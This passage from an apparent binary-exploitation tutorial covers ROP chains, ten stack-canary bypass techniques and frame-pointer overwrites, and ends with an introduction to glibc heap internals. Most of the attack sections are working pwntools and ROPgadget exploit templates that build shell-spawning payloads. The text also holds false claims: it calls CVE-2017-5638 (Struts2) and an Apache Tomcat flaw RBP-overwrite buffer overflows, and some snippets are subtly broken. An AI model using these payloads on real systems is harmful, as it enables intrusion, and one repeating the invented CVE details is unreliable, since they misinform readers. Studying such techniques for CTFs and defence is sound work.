pop rsi ; ret           ; Set RSI (2nd arg)
pop rdx ; ret           ; Set RDX (3rd arg)
```

2. **Function callers**

```asm
call system             ; Call function with args from registers
```

3. **Arithmetic/logic**

```asm
add rax, rbx ; ret
xor rax, rax ; ret
mov [rdi], rsi ; ret    ; Arbitrary write
```

4. **Control flow**

```asm
jmp rax
jne .target
cmp rax, rbx
```

**Gadget discovery**

ROPgadget automated search:

```bash
ROPgadget --binary /path/to/binary --all
```

Lists all gadgets, hundreds or thousands typical.

**Filter by gadget type:**

```bash
ROPgadget --binary /path/to/binary | grep "pop rdi"
ROPgadget --binary /path/to/binary | grep "add rax"
```

**Radare2 gadget search:**

```bash
r2 /path/to/binary
> /c "pop rdi"
> /c "call system"
```

**Pwntools ROP automation:**

```python
from pwn import *

binary = ELF('./binary')
rop = ROP(binary)

# Automatically find gadgets
rop.call('system', [elf.search(b'/bin/sh').__next__()])
rop.exit(0)

print(rop.dump())  # Display chain
```

**Manual ROP chain construction**

System call via `system()` function:

```python
# Addresses from ROPgadget
pop_rdi_ret = 0x401234      # pop rdi; ret
system_plt = 0x401050        # call system@plt
bin_sh = 0x402000            # "/bin/sh" string location

# Build chain
chain = p64(pop_rdi_ret)
chain += p64(bin_sh)         # First arg: /bin/sh
chain += p64(system_plt)     # call system

offset = 40
payload = b'A' * offset
payload += chain

p = process('./binary')
p.send(payload)
```

**Multi-argument system call**

System call with 6 arguments (RDI, RSI, RDX, RCX, R8, R9):

```python
pop_rdi_ret = 0x401234
pop_rsi_ret = 0x401235
pop_rdx_ret = 0x401236
pop_rcx_ret = 0x401237
pop_r8_ret = 0x401238
pop_r9_ret = 0x401239
execve_plt = 0x401060

chain = p64(pop_rdi_ret)
chain += p64(bin_sh_addr)    # RDI: filename
chain += p64(pop_rsi_ret)
chain += p64(argv_addr)      # RSI: argv
chain += p64(pop_rdx_ret)
chain += p64(0x0)            # RDX: envp (NULL)
chain += p64(execve_plt)
```

**ROP chain for arbitrary write**

Write primitive using existing gadgets:

```asm
mov [rdi], rsi ; ret   ; Write RSI to address RDI
```

Chain:

```python
pop_rdi_ret = 0x401234
pop_rsi_ret = 0x401235
mov_rdi_rsi = 0x401250      # mov [rdi], rsi; ret

target_addr = 0x602000
value = 0xdeadbeef

chain = p64(pop_rdi_ret)
chain += p64(target_addr)
chain += p64(pop_rsi_ret)
chain += p64(value)
chain += p64(mov_rdi_rsi)
```

**Conditional ROP chains**

Test condition, branch to different gadgets:

```python
# If rax == 0, jump to gadget_A, else gadget_B
cmp_rax_test = 0x401300     # cmp rax, 0; je .gadget_a
gadget_a = 0x401350
gadget_b = 0x401400

chain = p64(cmp_rax_test)   # Tests RAX
# If zero, jumps to gadget_a
# If non-zero, continues to gadget_b
```

[Inference] Conditional ROP requires direct control of branch targets; most ROP chains are linear without conditionals.

**Arithmetic operations in ROP**

Chain multiple gadgets for computation:

```python
# Compute rax + rbx, store in rax
pop_rax_ret = 0x401234
pop_rbx_ret = 0x401235
add_rax_rbx = 0x401250      # add rax, rbx; ret

chain = p64(pop_rax_ret)
chain += p64(0x100)
chain += p64(pop_rbx_ret)
chain += p64(0x200)
chain += p64(add_rax_rbx)   # RAX now = 0x300
```

**Loop-like behavior via repeated gadgets**

Simulate loops with repeated gadget chains:

```python
# Memset: fill buffer with byte value
pop_rdi_ret = 0x401234
pop_rsi_ret = 0x401235
pop_rdx_ret = 0x401236
call_memset = 0x401060

chain = p64(pop_rdi_ret)
chain += p64(buffer_addr)   # Destination
chain += p64(pop_rsi_ret)
chain += p64(0x41)          # Fill byte 'A'
chain += p64(pop_rdx_ret)
chain += p64(0x1000)        # Size
chain += p64(call_memset)
```

**Memory read via ROP**

Read memory without direct printf() access:

```python
# Write memory to file for exfiltration
open_gadget = 0x401350      # open("/tmp/leak", ...)
write_gadget = 0x401360     # write(fd, buf, size)

chain = p64(pop_rdi_ret)
chain += p64(filename_addr)
chain += p64(pop_rsi_ret)
chain += p64(0x601)         # O_WRONLY | O_CREAT
chain += p64(open_gadget)   # RAX = file descriptor

chain += p64(pop_rdi_ret)
chain += p64(rax)           # FD from previous call
chain += p64(pop_rsi_ret)
chain += p64(memory_to_leak)
chain += p64(pop_rdx_ret)
chain += p64(0x100)
chain += p64(write_gadget)
```

**PLT/GOT interaction with ROP**

Call imported functions via PLT:

```bash
objdump -d /path/to/binary | grep "@plt"
```

Output:

```
0000000000401050 <system@plt>:
  401050:	ff 25 ea 2f 00 00    	jmp    QWORD PTR [rip+0x2fea]
```

Address 0x401050 is consistent across ASLR:

```python
chain = p64(pop_rdi_ret)
chain += p64(bin_sh_addr)
chain += p64(0x401050)      # Call system@plt (fixed address)
```

**Pwntools ROP automation:**

```python
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

# Automatic gadget finding and chain building
rop.call('system', [elf.search(b'/bin/sh').__next__()])

print(rop.dump())
print(rop.chain())

offset = 40
payload = b'A' * offset
payload += rop.chain()
```

**GDB ROP verification**

```bash
gdb ./binary
(gdb) break main
(gdb) run
(gdb) set $rsp = 0x7ffffffde000
(gdb) x/20i $rip        # Disassemble from first gadget
(gdb) stepi 50          # Execute 50 instructions
(gdb) print $rax        # Verify computation
```

**Gadget classification:**

```
Useful gadgets:
- pop X; ret (6 variants: rdi, rsi, rdx, rcx, r8, r9)
- mov [rdi], rsi; ret
- add rax, rbx; ret
- xor rax, rax; ret
- call X

Problematic gadgets:
- pop rsp; ret (uncontrolled RSP modification)
- jmp r8 (indirect jumps require careful setup)
```

**Avoiding bad gadgets:**

ROPgadget filters:

```bash
ROPgadget --binary /path/to/binary --all | grep -v "jmp.*rsp"
```

Excludes problematic gadgets.

**ROP with stack canaries**

Canary doesn't stop ROP chains since gadgets don't return through canary-protected function:

```
Exploited function stack:
[buffer] [canary] [saved RBP] [return address]
              ↓
Overflow to return address, start ROP chain

ROP gadgets execute without returning through original function
```

**ROP with ASLR + PIE**

Addresses randomized, use GOT leaks to calculate offsets:

```python
# Leak GOT entry
leaked_puts = leak_via_format_string()

# Calculate binary base
binary_base = leaked_puts - binary.symbols['puts']

# Adjust gadget addresses
pop_rdi_ret = binary_base + 0x1234
system_plt = binary_base + 0x1050
```

**One-gadget ROP**

Single gadget enabling shell (no chain needed):

```bash
one_gadget ./libc.so.6
0x4f365 execve("/bin/sh", rsp+0x30, environ)
  constraints:
    rax == NULL
```

Simpler than full ROP chain:

```python
payload = b'A' * offset
payload += p64(libc_base + 0x4f365)
```

**Ropper automated ROP chain generation:**

```bash
ropper --file /path/to/binary --chain "exec"
```

Generates complete ROP chain automatically for common objectives.

---

## Stack Canary Bypass Techniques

Stack canaries detect buffer overflows by placing randomized values before return addresses. Bypass techniques leak canary values or overwrite return addresses without disturbing canary.

**Stack canary mechanism**

Compiler inserts canary during function prologue:

```asm
mov rax, [fs:0x28]      ; Load canary from TLS
mov [rbp-0x8], rax      ; Store on stack
```

During epilogue, verify canary:

```asm
mov rax, [rbp-0x8]
xor rax, [fs:0x28]      ; XOR with original
jne error_handler       ; Jump if different
```

**Canary location on stack**

```
[buffer] [canary] [saved RBP] [return address]
         ↑
      -0x8 from RBP
```

Standard placement 8 bytes below saved RBP, immediately above return address.

**Checksec canary detection:**

```bash
checksec --file=./binary
STACK CANARY    : Enabled
```

**Radare2 canary verification:**

```bash
r2 /path/to/binary
> aaa
> pdf @ main
```

Look for `mov rax, [fs:0x28]` instruction indicating canary presence.

**Bypass technique 1: Canary leak via format string**

Format string vulnerability reads stack memory:

```c
printf(user_input);  // Format string vuln
```

Exploit:

```python
# Format string reads stack
payload = "%x.%x.%x.%x.%x"
p.send(payload)
leak = p.recv(1024)

# Parse leak to find canary (typically 8 bytes starting with 00)
canary_value = parse_canary(leak)
```

**Precise canary leak:**

```python
# Offset calculation
# RBP at offset 6 on stack (from format string perspective)
# Canary at offset 5

payload = "%5$lx"      # Read 5th stack value
p.send(payload)
canary = int(p.recv(16), 16)
```

**Bypass technique 2: Canary overwrite with correct value**

After leaking canary, overflow with correct value in place:

```python
leaked_canary = leak_canary()

offset = 40
payload = b'A' * offset
payload += p64(leaked_canary)    # Correct canary
payload += p64(0x0)              # Saved RBP
payload += p64(target_addr)      # Return address

p.send(payload)
```

GDB verification:

```bash
gdb ./binary
(gdb) break vulnerable
(gdb) run $(python3 -c "print('A'*40 + 'CCCCCCCC' + 'DDDDDDDD' + 'EEEEEEEE')")
(gdb) x/10x $rbp-0x10
```

**Bypass technique 3: Information leak (uninitialized variable)**

Uninitialized stack variable may contain previous frame's canary:

```c
void sensitive() {
    int secret;
    printf("%d", secret);  // Uninitialized read
}

void vulnerable() {
    char buf[32];
    strcpy(buf, input);
    // Canary = secret's previous value
}
```

Attacker triggers sensitive(), then exploits vulnerable() with known canary.

**Bypass technique 4: Return address overwrite without canary corruption**

Carefully craft overflow to skip canary:

```
Buffer:        40 bytes (A's)
Canary target: 8 bytes (saved value, not overwritten)
Saved RBP:     8 bytes (can be garbage)
Return addr:   8 bytes (attacker-controlled)

Payload structure:
'A' * 40 + correct_canary + 'X' * 8 + new_return_addr
```

**Manual assembly:**

```python
offset = 40
canary_offset = offset + 8      # 48
rbp_offset = canary_offset + 8  # 56
ret_offset = rbp_offset + 8     # 64

payload = b'A' * offset
payload += canary_value         # Position [offset:offset+8]
payload += b'X' * 8             # Garbage RBP
payload += p64(target_addr)     # New return address
```

**Bypass technique 5: Null byte canary**

Rarely, canary value is all zeros (null canary), which strcpy() stops at:

```c
// Dangerous: null canary allows strcpy overflow
char buf[32];
strcpy(buf, user_input);  // Stops at \x00, skips canary
```

[Unverified] Modern glibc avoids null canaries specifically to prevent this bypass.

**Bypass technique 6: Fork + brute force**

When application forks for each connection, canary remains constant within parent process:

```python
for attempt in range(256):
    # Try single byte of canary
    payload = b'A' * offset
    payload += p64(0xXXXXXXXX000000 | attempt)  # Vary last byte
    
    p = process('./server')  # New connection = same canary
    p.send(payload)
    
    # Check if we got past canary check (might crash differently)
    if "Segmentation" not in p.recvall():
        canary_byte = attempt
        break
```

8 bytes canary = 256^8 attempts, infeasible. Requires reducing search space via:

- Partial leaks
- Known canary properties (often starts with 00)
- Timing side-channels

**Bypass technique 7: Canary value predictability**

Weak PRNG generating canary:

```c
// Weak canary generation
canary = rand();  // Predictable if seed known
```

Exploit:

```python
# Determine PRNG seed
seed = get_process_seed()
next_canary = predict_rand(seed)

payload = exploit_with_canary(next_canary)
```

[Unverified] Glibc uses secure PRNG from `/dev/urandom` for canaries; weak generators extremely rare in modern systems.

**Bypass technique 8: Stack reading gadget**

ROP gadget reading stack memory enables canary disclosure:

```asm
mov rax, [rsp+0x8] ; ret   ; Read from stack
```

Chain:

```python
rop = ROP(binary)
rop.raw(read_stack_gadget)
rop.call('write', [1, rsp+0x8, 8])  # Write canary to stdout
```

Leaks canary without format string.

**Bypass technique 9: Partial overwrite (little-endian)**

Little-endian canary storage allows partial overwrite:

```
Canary: 0x1122334455667788
Stored: 88 77 66 55 44 33 22 11 (little-endian bytes)

Overflow only first byte:
Original: 88 77 66 55 44 33 22 11
Overflow: XX 77 66 55 44 33 22 11  (only first byte changed)
```

[Inference] If attacker predicts canary value modulo 256, single-byte overflow succeeds. Extremely unreliable.

**Bypass technique 10: Signal handler canary**

Signal handler stack frame has separate canary verification:

```c
void sig_handler() {
    // Signal handler stack frame
    // Canary verified separately
}

// Main function
void vulnerable() {
    char buf[32];
    strcpy(buf, input);  // Overflow, trigger signal
    raise(SIGUSR1);      // Signal handler called
}
```

Exploit overflow triggering signal, signal handler continues execution.

**Canary extraction via timing side-channel**

[Unverified] Theoretical timing side-channel detecting canary mismatch:

```python
# Measure time for canary check failure
times = []
for byte_val in range(256):
    canary_guess = (byte_val << 0)
    start = time.time()
    trigger_canary_check(canary_guess)
    elapsed = time.time() - start
    times.append((byte_val, elapsed))

correct_byte = max(times, key=lambda x: x[1])[0]
```

Modern CPUs with speculative execution and constant-time checks prevent this.

**Canary bypass combined with ASLR + PIE**

Canary leak alone insufficient; also leak addresses:

```python
# Format string leaks both canary and return address
payload = "%5$lx.%6$lx"  # Canary and RA

# Parse leaks
canary = leaked_values[0]
return_addr = leaked_values[1]

# Calculate binary base
binary_base = return_addr - known_offset

# Exploit with both leaks
payload = exploit(canary, binary_base)
```

**Detection via AddressSanitizer:**

ASAN catches canary bypass attempts:

```bash
gcc -fsanitize=address -g program.c -o program
./program overflow_payload
```

Output:

```
ERROR: AddressSanitizer: stack-buffer-overflow on address 0x...
```

**GDB canary observation:**

```bash
gdb ./binary
(gdb) break vulnerable
(gdb) run
(gdb) x/10gx $rbp-0x20
(gdb) x/gx $fs:0x28      ; Read TLS canary location
0x7ffff7e20cc0:	0x1234567890abcdef
(gdb) x/10gx $rbp-0x20
```

Compare stack canary with TLS value to verify correct placement.

**Automated canary bypass tool:**

Pwntools includes canary handling:

```python
from pwn import *

p = process('./binary')

# Leak canary via format string
payload = "%5$p"
p.sendline(payload)
leak = p.recvline()
canary = int(leak, 16)

# Exploit with correct canary
offset = 40
rop = ROP(elf)
rop.call('system', [elf.search(b'/bin/sh').__next__()])

exploit = b'A' * offset
exploit += p64(canary)
exploit += p64(0x0)  # RBP
exploit += rop.chain()

p.sendline(exploit)
p.interactive()
```

---

## Frame Pointer Overwrite

Frame pointer (RBP) exploitation enables arbitrary code execution through pointer overwrite, affecting memory dereference operations or return address calculations in specific code patterns.

**Frame pointer role**

RBP (base pointer) establishes reference point for local variables and parameters:

```asm
mov rbp, rsp          ; Establish frame pointer
mov rax, [rbp-0x8]    ; Access local variable
mov rax, [rbp+0x10]   ; Access parameter
```

Overwrite RBP, subsequent [RBP±offset] operations access arbitrary memory.

**Stack layout with manipulable RBP**

```
[buffer] [canary] [saved RBP] [return address]
              ↑
        Exploitation target
```

Overflow corrupts saved RBP value restored during epilogue.

**Exploitation: leave; ret pattern**

Function epilogue executes:

```asm
leave        ; mov rsp, rbp; pop rbp
ret
```

`leave` instruction:

1. Moves RBP to RSP (new RSP = old RBP)
2. Pops new RBP from stack

If corrupted RBP points to attacker-controlled memory:

```
Overwritten RBP: 0x601000 (attacker-controlled)
leave:
  mov rsp, 0x601000    ; RSP now points to attacker buffer
  pop rbp              ; RBP = [0x601000]
ret                    ; RIP = [RSP] = [0x601000+8]
```

**Basic RBP overwrite exploitation**

Prerequisites:

1. Attacker-controlled memory at fixed address (heap, BSS, data section)
2. Place fake stack frame: [garbage] [new return address]
3. Overwrite RBP to point to fake frame

**Exploitation:**

```python
# Write fake frame to heap/bss
fake_rbp = 0x602000
fake_frame = b'X' * 8          # Garbage RBP
fake_frame += p64(target_addr) # Return address

# Write fake frame to known location
write_primitive(fake_rbp, fake_frame)

# Overflow vulnerable buffer, overwrite saved RBP
offset = 40
payload = b'A' * offset
payload += p64(canary)         # Correct canary
payload += p64(fake_rbp)       # Corrupted RBP points to fake frame
payload += b'garbage'          # Original return address (overwritten)

p.send(payload)
# When function returns:
# leave: mov rsp, 0x602000; pop rbp
# ret: pop rip from [0x602000+8]
```

**GDB verification of RBP overwrite:**

```bash
gdb ./binary
(gdb) break vulnerable
(gdb) run payload
(gdb) x/10x $rbp
(gdb) stepi               ; Execute leave
(gdb) print $rsp          ; Should equal fake_rbp
(gdb) print $rbp          ; Should equal [fake_rbp]
(gdb) stepi               ; Execute ret
(gdb) print $rip          ; Should equal target_addr
```

**RBP overwrite with controlled memory write**

`leave` changes RSP, enabling stack-based arbitrary write:

```c
void vulnerable() {
    int x;
    char buf[32];
    strcpy(buf, input);
    return;  // leave; ret
}

void caller() {
    vulnerable();
    printf("x = %d\n", x);  // Reads from manipulated address
}
```

Technique:

1. Overwrite RBP to point to target location
2. `leave` sets RSP to target
3. Subsequent stack operations write to target location

**Exploitation chain:**

```python
# Target memory location
target_write_addr = 0x601000

# Fake frame at target address
# (function epilogue will read return address from target+8)
fake_frame_addr = target_write_addr - 8

# Write fake frame containing shell gadget
payload_at_target = b'X' * 8
payload_at_target += p64(shell_gadget_addr)

write_primitive(target_write_addr, payload_at_target)

# Overflow RBP
offset = 40
overflow = b'A' * offset
overflow += p64(canary)
overflow += p64(fake_frame_addr)  # RBP points to fake frame

p.send(overflow)
```

**RBP overwrite enabling arbitrary read**

Stack-based reading through RBP manipulation:

```c
void leak_memory(void *target_addr) {
    char buf[32];
    strcpy(buf, "");
    
    // After overflow, RBP points to target_addr
    // Function accessing [RBP±offset] reads target memory
    int secret = *(int *)[RBP+0x100];
}
```

Technique: Overwrite RBP to point to address-1, subsequent [RBP+offset] accesses target memory.

**Exploitation:**

```python
# Target memory to leak
leak_addr = 0x601234

# Overwrite RBP to enable reading
target_rbp = leak_addr - 0x100

# Overflow
offset = 40
payload = b'A' * offset
payload += p64(canary)
payload += p64(target_rbp)
payload += b'gadget_addr'

p.send(payload)
# Function accesses [target_rbp + 0x100] = [leak_addr]
```

**RBP chain attack**

Chain multiple RBP overwrites across function calls:

```
Function A (vulnerable):
  Overflow, overwrite RBP -> points to fake frame at heap
  leave; ret -> RSP = heap, execute gadget

Gadget (at heap):
  Calls Function B
  
Function B:
  Epilogue processes corrupted RBP from previous frame
  Chains to another gadget
```

Sequential RBP overwrites enable complex exploitation without traditional ROP.

**Heap-based RBP chain construction:**

```python
# First frame
frame_1 = b'X' * 8
frame_1 += p64(first_gadget_addr)

# Second frame (at different heap location)
frame_2 = b'X' * 8
frame_2 += p64(second_gadget_addr)

# Write frames
write_at(0x602000, frame_1)
write_at(0x603000, frame_2)

# First overflow
payload = b'A' * 40
payload += p64(canary)
payload += p64(0x602000 - 8)  # Points to frame_1

p.send(payload)
# leave restores stack from frame_1
# Gadget at frame_1 continues chain
```

**Setjmp/longjmp with RBP overwrite**

Setjmp saves stack state including RBP:

```c
jmp_buf buf;
setjmp(buf);           // Saves RBP, RSP, RIP

// Later:
longjmp(buf, 1);       // Restores saved state
```

RBP overwrite before setjmp corrupts saved state:

```python
# Overflow RBP before setjmp() call
offset = 40
payload = b'A' * offset
payload += p64(canary)
payload += p64(attacker_rbp)

p.send(payload)

# Binary calls setjmp(), corrupted RBP saved
# Later longjmp() restores corrupted RBP
# Function continues with wrong stack frame
```

**RBP overwrite with saved register corruption**

Saved callee registers often stored relative to RBP:

```asm
push rbp
mov rbp, rsp
push rbx              ; [RBP-0x8]
push r12              ; [RBP-0x10]
push r13              ; [RBP-0x18]
```

Overwrite RBP, subsequent pop operations read from wrong addresses:

```
Original RBP: 0x7ffffffde7e0
Corrupted RBP: 0x601000

Original pop rbx: reads from [0x7ffffffde7e0-0x8]
Corrupted pop rbx: reads from [0x601000-0x8]
```

**Stack frame pointer confusion**

RBP confusion across nested function calls:

```c
void func_a() {
    char buf[32];
    strcpy(buf, input);  // Overflow RBP
    func_b();
}

void func_b() {
    // RBP now corrupted from func_a
    int local = 42;
    printf("%d\n", local);  // Accesses wrong memory
}
```

Technique: Overwrite RBP in func_a, func_b's frame pointer references become corrupted.

**Radare2 RBP tracking:**

```bash
r2 /path/to/binary
> aaa
> pdf @ vulnerable_function
```

Look for RBP-relative addressing patterns:

```
mov rax, [rbp-0x20]
mov rbx, [rbp-0x8]
mov rcx, [rbp+0x10]
```

All become exploitable after RBP corruption.

**GDB RBP manipulation:**

```bash
gdb ./binary
(gdb) break vulnerable
(gdb) run
(gdb) print $rbp
$1 = (void *) 0x7ffffffde7e0
(gdb) set $rbp = 0x601000
(gdb) continue
# Execution proceeds with corrupted RBP
(gdb) x/10x $rbp
```

**Detection: RBP sanity checks**

Modern code includes RBP validation:

```c
void function() {
    if ((uintptr_t)&buf > (uintptr_t)__builtin_frame_address(0)) {
        // RBP likely corrupted, bail
        exit(1);
    }
}
```

Bypasses:

```python
# Corrupted RBP still satisfies basic checks if carefully chosen
# Set RBP to address within valid range
corrupted_rbp = 0x601000  # BSS, often within valid range
```

**RBP overwrite with shadow stack (CET)**

Control Flow Enforcement Technology maintains separate shadow stack:

```bash
checksec --file=./binary
Clang CFI        : Yes     # Control Flow Integrity present
```

Shadow stack contains expected return addresses, compared against RIP at return. RBP overwrite attacks continue working since shadow stack doesn't protect RBP, only return addresses.

**CET bypass remains possible via:**

1. RBP-based exploitation (RBP not protected by CET)
2. Data corruption via corrupted RBP
3. Information disclosure through RBP manipulation

**Frame pointer elimination (FPO) interaction**

With frame pointer elimination (`-fomit-frame-pointer`):

```bash
objdump -d /path/to/binary | grep -c "push.*rbp"
```

Low count indicates FPO. No saved RBP means RBP overwrite impossible, but RSP-relative addressing creates different exploitation vectors.

**ARM frame pointer exploitation**

ARM uses R11 as frame pointer:

```asm
push {r11, lr}        ; Save FP and return address
add r11, sp, #4       ; Establish new FP
```

Exploitation similar, target R11 instead of RBP:

```python
# Corrupt R11 (frame pointer)
payload = b'A' * offset
payload += p64(fake_frame_addr)  # R11 target
```

**Exploitation detection via crashes**

Incorrect RBP overwrites cause segfaults:

```python
# Try overwrite, monitor for crash pattern
try:
    p.send(payload)
    p.recv(1024, timeout=1)
except:
    print("Crash detected - RBP overwrite may have worked")
```

GDB backtrace shows corruption:

```bash
(gdb) bt
#0 0x4010ab in vulnerable_function () from /path/to/binary
#1 0xdeadbeef in ?? ()
#2 0x00000000 in ?? ()
```

Invalid addresses indicate successful RBP overwrite.

**Combined exploitation: RBP overwrite + canary bypass**

Simultaneous corruption of canary and RBP:

```python
# Leak canary first
leaked_canary = leak_via_format_string()

# Overflow with both leaks
offset = 40
payload = b'A' * offset
payload += p64(leaked_canary)          # Correct canary (passes check)
payload += p64(fake_frame_addr)        # Corrupted RBP (enables exploitation)
payload += b'garbage_return_addr'

p.send(payload)
# Canary check passes, RBP corruption succeeds
```

**Exploitation automation:**

Pwntools frame pointer operations:

```python
from pwn import *

# Set up fake frame in accessible memory
fake_frame_addr = 0x602000
fake_frame = b'X' * 8 + p64(shell_gadget)

write_at(fake_frame_addr, fake_frame)

# Build exploit
offset = 40
rop = ROP(binary)
rop.call('system', [elf.search(b'/bin/sh').__next__()])

payload = b'A' * offset
payload += p64(leaked_canary)
payload += p64(fake_frame_addr - 8)

p.send(payload)
```

**Real-world RBP overwrite examples**

Struts2 Jakarta Multipart vulnerability (CVE-2017-5638):

- Exploited file upload handling
- RBP overwrite through multipart parsing buffer overflow
- Enabled arbitrary code execution on vulnerable servers

Apache Tomcat vulnerability:

- Catalina servlet processing with corrupted RBP
- Caused information disclosure and potential code execution

---

**Related advanced stack exploitation subtopics essential for comprehensive attacks:** Sigreturn-oriented programming (SROP) using signal frames for exploitation, stack exfiltration via pointer chasing from corrupted RBP, and blind exploitation techniques bypassing information disclosure requirements through deterministic memory layouts and symbol prediction.

---

# Heap Exploitation

## Heap Allocator Internals (glibc malloc, ptmalloc2)

### Fundamental Heap Concepts

**Heap vs Stack:**

- **Stack:** Fixed-size, automatic allocation/deallocation, LIFO structure
- **Heap:** Dynamic allocation, manual management (`malloc`/`free`), complex internal structure

**Why heap exploitation matters:**

- Larger attack surface in modern applications
- Complex metadata structures vulnerable to corruption
- Can lead to arbitrary write primitives
- Often bypasses stack protections (canaries, NX)

### ptmalloc2 Architecture

**ptmalloc2 (pthreads malloc):** glibc's default heap allocator since version 2.3

**Key design goals:**

- Thread-safe operation (multiple arenas)
- Performance optimization (bins, caching)
- Fragmentation reduction
- Reasonable security (metadata checksums, size validation)

**Core data structures:**

```
┌─────────────────┐
│   Main Arena    │ ← Initial heap for main thread
├─────────────────┤
│  Thread Arena 1 │ ← Separate heap for thread 1
├─────────────────┤
│  Thread Arena 2 │ ← Separate heap for thread 2
└─────────────────┘
```

### Chunk Structure

**Allocated chunk layout:**

```
┌──────────────────────┐
│  prev_size           │ ← Size of previous chunk (if free)
├──────────────────────┤
│  size | A | M | P    │ ← Current chunk size + flags
├──────────────────────┤ ← User data starts here (returned by malloc)
│  User Data           │
│  ...                 │
│                      │
└──────────────────────┘
```

**Free chunk layout:**

```
┌──────────────────────┐
│  prev_size           │ ← Size of previous physical chunk
├──────────────────────┤
│  size | A | M | P    │ ← Current chunk size + flags
├──────────────────────┤
│  fd                  │ ← Forward pointer (next free chunk)
├──────────────────────┤
│  bk                  │ ← Backward pointer (prev free chunk)
├──────────────────────┤
│  fd_nextsize         │ ← Used in large bins only
├──────────────────────┤
│  bk_nextsize         │ ← Used in large bins only
├──────────────────────┤
│  ...                 │
│  Unused space        │
└──────────────────────┘
```

**Size field flags (3 least significant bits):**

- **P (PREV_INUSE, 0x01):** Previous chunk is in use (allocated)
- **M (IS_MMAPPED, 0x02):** Chunk obtained via mmap (large allocations)
- **A (NON_MAIN_ARENA, 0x04):** Chunk belongs to non-main arena (thread arena)

**Size alignment:**

```c
// Chunks always aligned to 16 bytes on x64, 8 bytes on x86
// Size stored with flags in lower 3 bits
// Actual size: size & ~0x7 (mask off flags)

// Example:
// size field = 0x91
// Actual size = 0x90 (144 bytes)
// Flags: P=1 (prev in use), M=0, A=0
```

**Minimum chunk size:**

```
x86:   16 bytes (8 prev_size + 8 size+user data)
x64:   32 bytes (8 prev_size + 8 size + 16 user data minimum)
```

### Memory Allocation Process

**malloc(size) workflow:**

**Step 1: Size calculation**

```c
// Request size → actual chunk size
// Includes metadata overhead + alignment

// x64 example:
malloc(24)
// + 8 bytes size field = 32 bytes
// Aligned to 16 bytes → 32 bytes chunk size
```

**Step 2: Check tcache (glibc ≥ 2.26)**

```
If tcache bin for this size has chunks:
    → Return chunk from tcache (fast path)
```

**Step 3: Check fastbins**

```
If size fits fastbin (≤ 0x80 bytes on x64):
    If fastbin for this size has chunks:
        → Return chunk from fastbin
```

**Step 4: Check small bins**

```
If size fits smallbin (< 0x400 bytes):
    If exact-size smallbin has chunks:
        → Return chunk from smallbin
```

**Step 5: Consolidate fastbins**

```
If fastbins not empty:
    → Consolidate fastbins into unsorted bin
```

**Step 6: Check unsorted bin**

```
Process all chunks in unsorted bin:
    If exact match:
        → Return chunk
    Else:
        → Place chunk in appropriate small/large bin
```

**Step 7: Check large bins**

```
If size requires large bin:
    Search for best-fit chunk in large bins
```

**Step 8: Use top chunk**

```
If top chunk large enough:
    → Split top chunk, return requested portion
Else:
    → Extend heap via brk() or mmap()
```

### Free Memory Management

**free(ptr) workflow:**

**Step 1: Validate pointer**

```c
// Check alignment
// Check size field sanity
// Check double-free (P flag in next chunk)
```

**Step 2: Determine bin type**

```
If size ≤ fastbin max (0x80 on x64):
    → Place in fastbin (no consolidation)
    → Also place in tcache if available

If size ≥ mmap threshold:
    → munmap() directly (return to OS)

Else:
    → Place in unsorted bin
    → Attempt consolidation
```

**Step 3: Consolidation (if not fastbin)**

```c
// Backward consolidation
if (!(prev_chunk_size & PREV_INUSE)) {
    // Previous chunk is free
    // Unlink previous chunk from its bin
    // Merge with previous chunk
}

// Forward consolidation
if (next_chunk not top && !(next_next_chunk_size & PREV_INUSE)) {
    // Next chunk is free
    // Unlink next chunk from its bin
    // Merge with next chunk
}

// Place consolidated chunk in unsorted bin
```

### Bin System Overview

**Bins:** Linked lists of free chunks organized by size

**Bin types:**

**1. Tcache (Thread Local Cache) - glibc ≥ 2.26**

```
Counts: 64 bins
Size range: 24 to 1032 bytes (16-byte increments on x64)
Max per bin: 7 chunks (default)
Structure: Singly-linked list (LIFO)
Fast path: No security checks on removal
```

**2. Fastbins**

```
Counts: 10 bins
Size range: 32 to 176 bytes (16-byte increments on x64)
Structure: Singly-linked list (LIFO)
No consolidation: Chunks remain separate for performance
Special: PREV_INUSE always set on fastbin chunks
```

**3. Small bins**

```
Counts: 62 bins
Size range: < 1024 bytes
Exact-fit: Each bin holds single size
Structure: Doubly-linked circular list (FIFO)
Consolidation: Chunks consolidated on free
```

**4. Large bins**

```
Counts: 63 bins
Size range: ≥ 1024 bytes
Size ranges per bin (increasingly large ranges)
Structure: Doubly-linked circular list + size-ordered
Additional pointers: fd_nextsize, bk_nextsize
```

**5. Unsorted bin**

```
Count: 1 bin
Purpose: Recently freed chunks (temporary holding)
Processing: Sorted into small/large bins on next malloc
Structure: Doubly-linked circular list
```

### Bin Data Structures

**Fastbin structure:**

```c
// Array of fastbin heads (singly-linked)
mfastbinptr fastbinsY[NFASTBINS];

// Each fastbin chunk:
struct fastbin_chunk {
    size_t prev_size;  // Unused in fastbins
    size_t size;       // Size with flags
    struct fastbin_chunk *fd;  // Forward pointer only
    // No bk pointer (singly-linked)
};
```

**Example fastbin:**

```
fastbinsY[2] (size 0x40):
    → Chunk A (0x40) → Chunk B (0x40) → Chunk C (0x40) → NULL
```

**Small/large bin structure:**

```c
// Doubly-linked circular list
struct malloc_chunk {
    size_t prev_size;
    size_t size;
    struct malloc_chunk *fd;  // Forward
    struct malloc_chunk *bk;  // Backward
};

// Bins array in malloc_state (arena)
mchunkptr bins[NBINS * 2];  // Each bin has fd and bk pointers
```

**Example small bin:**

```
bin[10] (size 0xa0):
    ┌─────────────────────────────────────────┐
    │                                         ↓
   bin ←→ Chunk A (0xa0) ←→ Chunk B (0xa0) ←→ bin
    ↑                                         │
    └─────────────────────────────────────────┘
```

**Large bin (with size ordering):**

```
bin[64] (size 1024-1088):
    ┌──→ Chunk A (1088) ←→ Chunk B (1056) ←→ Chunk C (1024) ←──┐
    │          ↓                                      ↑          │
    │          └────────────(fd_nextsize)────────────┘          │
    bin ←─────────────────────────────────────────────────────→ bin
```

### Tcache Structure (glibc ≥ 2.26)

**Tcache entry:**

```c
typedef struct tcache_entry {
    struct tcache_entry *next;  // Single pointer (singly-linked)
    // Key field added in glibc 2.29+ for double-free detection
    uintptr_t key;  
} tcache_entry;

typedef struct tcache_perthread_struct {
    uint16_t counts[TCACHE_MAX_BINS];  // Count per bin (max 7)
    tcache_entry *entries[TCACHE_MAX_BINS];  // Head pointers
} tcache_perthread_struct;
```

**Tcache characteristics:**

- **Per-thread:** Each thread has own tcache
